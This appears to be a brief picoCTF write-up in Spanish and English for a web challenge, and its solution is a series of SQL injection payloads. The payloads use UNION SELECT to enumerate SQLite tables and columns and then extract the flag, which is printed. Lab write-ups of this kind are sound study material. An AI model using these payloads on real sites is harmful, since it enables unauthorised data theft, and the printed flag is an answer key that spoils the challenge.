## Descripción
Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:50180/).
## Solución
Se invierte el orden de login y password para ingresar, una vez dentro buscamos
Algiers' UNION SELECT null, null, null --
Algiers' UNION SELECT null, null, name FROM sqlite_master WHERE type='table'  --
Algiers' UNION SELECT null, null, name FROM PRAGMA_table_info('more table')  --
Algiers' UNION SELECT null, null, flag FROM more_table --

picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6}
## Notas adicionales

## Referencias
